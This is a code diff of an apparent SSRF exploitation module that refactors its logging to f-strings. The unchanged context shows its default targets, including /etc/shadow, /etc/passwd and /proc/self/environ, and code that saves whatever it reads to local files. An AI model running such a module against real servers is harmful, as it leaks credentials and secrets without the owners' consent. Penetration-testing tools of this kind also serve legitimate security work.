@@ -11,7 +11,7 @@ documentation = []
 class exploit():
     
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
         self.files = args.targetfiles.split(',') if args.targetfiles != None else ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts", "\/\/etc/passwd", "/proc/self/environ", "/proc/self/cmdline", "/proc/self/cwd/index.php", "/proc/self/cwd/application.py", "/proc/self/cwd/main.py", "/proc/self/exe"]   
         
         r = requester.do_request(args.param, "")
@@ -30,12 +30,12 @@ class exploit():
                 if diff != "":
 
                     # Display diff between default and ssrf request
-                    logging.info("\033[32mReading file\033[0m : {}".format(f))
+                    logging.info(f"\033[32mReading file\033[0m : {f}")
                     print(diff)
 
                     # Write diff to a file
                     filename = f.replace('\\','_').replace('/','_')
-                    logging.info("\033[32mWriting file\033[0m : {} to {}".format(f, directory + "/" + filename))
+                    logging.info(f"\033[32mWriting file\033[0m : {f} to {directory + '/' + filename}")
                     with open(directory + "/" + filename, 'w') as f:
                         f.write(diff)
 
